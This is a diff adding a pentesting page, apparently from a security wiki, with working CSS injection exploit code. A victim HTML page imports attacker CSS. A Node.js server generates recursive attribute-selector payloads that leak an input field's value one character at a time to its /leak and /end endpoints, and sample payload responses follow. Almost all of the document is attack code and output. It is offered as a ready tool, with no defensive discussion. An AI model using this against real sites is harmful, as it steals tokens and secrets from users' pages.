@@ -1,0 +1,216 @@
+# CSS Injection Code
+
+
+
+{% code title="victim.html" %}
+```html
+<!doctype html>
+<body>
+    <div><article><div><p><div><div><div><div><div>
+<input type="text" value="1234567890">
+<style>
+@import url('//localhost:5001/start?');
+</style>
+```
+{% endcode %}
+
+{% code title="server.js" %}
+```javascript
+const http = require('http');
+const url = require('url');
+
+// Port to exfiltrate to
+const port = 5001;
+// Host to exfiltrate to
+const HOSTNAME = "http://localhost:5001";
+const DEBUG = false;
+
+var prefix = "", postfix = "";
+var pending = [];
+var stop = false, ready = 0, n = 0;
+
+const requestHandler = (request, response) => {
+    let req = url.parse(request.url, url);
+    log('\treq: %s', request.url);
+    
+    //If stop, leakeage is finished
+    if (stop) return response.end();
+    
+    switch (req.pathname) {
+        // This only launched when starting the leakeage
+        case "/start":
+            genResponse(response);
+            break;
+        
+        // Everytime something is leaked
+        case "/leak":
+            response.end();
+            // If response comes with a pre, then we leaked some preffix s(E)cret
+            if (req.query.pre && prefix !== req.query.pre) {
+                prefix = req.query.pre;
+            
+            // If response comes with a post, then we leaked some suffix secre(T)
+            } else if (req.query.post && postfix !== req.query.post) {
+               postfix = req.query.post;
+            } else {
+                break;
+            }
+            
+            // Always a pre and a post response must arrived before responding the "next" @import (which is waiting for response)
+            if (ready == 2) {
+                genResponse(pending.shift());
+                ready = 0;
+            } else {
+                ready++;
+                log('\tleak: waiting others...');
+            }
+            break;
+        
+        // While waiting for a pre and a post, the next @import is waiting to be responded
+        // by a new generated payload with another "pre" and "post"
+        case "/next":
+            if (ready == 2) {
+                genResponse(respose);
+                ready = 0;
+            } else {
+                pending.push(response);
+                ready++;
+                log('\tquery: waiting others...');
+            }
+            break;
+        
+        // Called when the secret is leaked
+        case "/end":
+            stop = true;
+            console.log('[+] END: %s', req.query.token);
+        
+        default:
+            response.end();
+    }
+}
+
+const genResponse = (response) => {
+    // Verbose output to know what do we know
+    console.log('...pre-payoad: ' + prefix);
+    console.log('...post-payoad: ' + postfix);
+
+    // Payload generation, you have an example of what is generated below
+    let css = '@import url('+ HOSTNAME + '/next?' + Math.random() + ');\n' +
+        [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'].map(e => ('input[value$="' + e + postfix + '"]{--e'+n+':url(' + HOSTNAME + '/leak?post=' + e + postfix + ')}')).join('') +
+        'div '.repeat(n) + 'input{background:var(--e'+n+')}' +
+        [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'].map(e => ('input[value^="' + prefix + e + '"]{--s'+n+':url(' + HOSTNAME + '/leak?pre=' + prefix + e +')}')).join('') +
+        'div '.repeat(n) + 'input{border-image:var(--s'+n+')}' +
+        'input[value='+ prefix + postfix + ']{list-style:url(' + HOSTNAME + '/end?token=' + prefix + postfix + '&)};';
+    
+    response.writeHead(200, { 'Content-Type': 'text/css'});
+    response.write(css);
+    response.end();
+    n++;
+}
+
+
+// Server listening
+const server = http.createServer(requestHandler)
+
+server.listen(port, (err) => {
+    if (err) {
+        return console.log('[-] Error: something bad happened', err);
+    }
+    console.log('[+] Server is listening on %d', port);
+})
+
+function log() {
+    if (DEBUG) console.log.apply(console, arguments);
+}
+
+/*
+HTTP/1.1 200 OK
+Content-Type: text/css
+Date: Fri, 01 Apr 2022 14:35:39 GMT
+Connection: close
+Content-Length: 2149
+
+@import url(http://localhost:5001/next?0.7834603960990516);
+input[value$="0"]{--e0:url(http://localhost:5001/leak?post=0)}
+input[value$="1"]{--e0:url(http://localhost:5001/leak?post=1)}
+input[value$="2"]{--e0:url(http://localhost:5001/leak?post=2)}
+input[value$="3"]{--e0:url(http://localhost:5001/leak?post=3)}
+input[value$="4"]{--e0:url(http://localhost:5001/leak?post=4)}
+input[value$="5"]{--e0:url(http://localhost:5001/leak?post=5)}
+input[value$="6"]{--e0:url(http://localhost:5001/leak?post=6)}
+input[value$="7"]{--e0:url(http://localhost:5001/leak?post=7)}
+input[value$="8"]{--e0:url(http://localhost:5001/leak?post=8)}
+input[value$="9"]{--e0:url(http://localhost:5001/leak?post=9)}
+input[value$="a"]{--e0:url(http://localhost:5001/leak?post=a)}
+input[value$="b"]{--e0:url(http://localhost:5001/leak?post=b)}
+input[value$="c"]{--e0:url(http://localhost:5001/leak?post=c)}
+input[value$="d"]{--e0:url(http://localhost:5001/leak?post=d)}
+input[value$="e"]{--e0:url(http://localhost:5001/leak?post=e)}
+input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
+input{background:var(--e0)}
+input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}
+input[value^="1"]{--s0:url(http://localhost:5001/leak?pre=1)}
+input[value^="2"]{--s0:url(http://localhost:5001/leak?pre=2)}
+input[value^="3"]{--s0:url(http://localhost:5001/leak?pre=3)}
+input[value^="4"]{--s0:url(http://localhost:5001/leak?pre=4)}
+input[value^="5"]{--s0:url(http://localhost:5001/leak?pre=5)}
+input[value^="6"]{--s0:url(http://localhost:5001/leak?pre=6)}
+input[value^="7"]{--s0:url(http://localhost:5001/leak?pre=7)}
+input[value^="8"]{--s0:url(http://localhost:5001/leak?pre=8)}
+input[value^="9"]{--s0:url(http://localhost:5001/leak?pre=9)}
+input[value^="a"]{--s0:url(http://localhost:5001/leak?pre=a)}
+input[value^="b"]{--s0:url(http://localhost:5001/leak?pre=b)}
+input[value^="c"]{--s0:url(http://localhost:5001/leak?pre=c)}
+input[value^="d"]{--s0:url(http://localhost:5001/leak?pre=d)}
+input[value^="e"]{--s0:url(http://localhost:5001/leak?pre=e)}
+input[value^="f"]{--s0:url(http://localhost:5001/leak?pre=f)}
+input{border-image:var(--s0)}
+input[value=]{list-style:url(http://localhost:5001/end?token=&)};
+*/
+
+/*
+HTTP/1.1 200 OK
+Content-Type: text/css
+Date: Fri, 01 Apr 2022 14:35:39 GMT
+Connection: close
+Content-Length: 2149
+
+@import url(http://localhost:5001/next?0.7834603960990516);
+input[value$="0"]{--e0:url(http://localhost:5001/leak?post=0)}
+input[value$="1"]{--e0:url(http://localhost:5001/leak?post=1)}
+input[value$="2"]{--e0:url(http://localhost:5001/leak?post=2)}
+input[value$="3"]{--e0:url(http://localhost:5001/leak?post=3)}
+input[value$="4"]{--e0:url(http://localhost:5001/leak?post=4)}
+input[value$="5"]{--e0:url(http://localhost:5001/leak?post=5)}
+input[value$="6"]{--e0:url(http://localhost:5001/leak?post=6)}
+input[value$="7"]{--e0:url(http://localhost:5001/leak?post=7)}
+input[value$="8"]{--e0:url(http://localhost:5001/leak?post=8)}
+input[value$="9"]{--e0:url(http://localhost:5001/leak?post=9)}
+input[value$="a"]{--e0:url(http://localhost:5001/leak?post=a)}
+input[value$="b"]{--e0:url(http://localhost:5001/leak?post=b)}
+input[value$="c"]{--e0:url(http://localhost:5001/leak?post=c)}
+input[value$="d"]{--e0:url(http://localhost:5001/leak?post=d)}
+input[value$="e"]{--e0:url(http://localhost:5001/leak?post=e)}
+input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
+input{background:var(--e0)}
+input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}
+input[value^="1"]{--s0:url(http://localhost:5001/leak?pre=1)}
+input[value^="2"]{--s0:url(http://localhost:5001/leak?pre=2)}
+input[value^="3"]{--s0:url(http://localhost:5001/leak?pre=3)}
+input[value^="4"]{--s0:url(http://localhost:5001/leak?pre=4)}
+input[value^="5"]{--s0:url(http://localhost:5001/leak?pre=5)}
+input[value^="6"]{--s0:url(http://localhost:5001/leak?pre=6)}
+input[value^="7"]{--s0:url(http://localhost:5001/leak?pre=7)}
+input[value^="8"]{--s0:url(http://localhost:5001/leak?pre=8)}
+input[value^="9"]{--s0:url(http://localhost:5001/leak?pre=9)}
+input[value^="a"]{--s0:url(http://localhost:5001/leak?pre=a)}
+input[value^="b"]{--s0:url(http://localhost:5001/leak?pre=b)}
+input[value^="c"]{--s0:url(http://localhost:5001/leak?pre=c)}
+input[value^="d"]{--s0:url(http://localhost:5001/leak?pre=d)}
+input[value^="e"]{--s0:url(http://localhost:5001/leak?pre=e)}
+input[value^="f"]{--s0:url(http://localhost:5001/leak?pre=f)}
+input{border-image:var(--s0)}
+input[value=]{list-style:url(http://localhost:5001/end?token=&)};
+*/
+```
+{% endcode %}
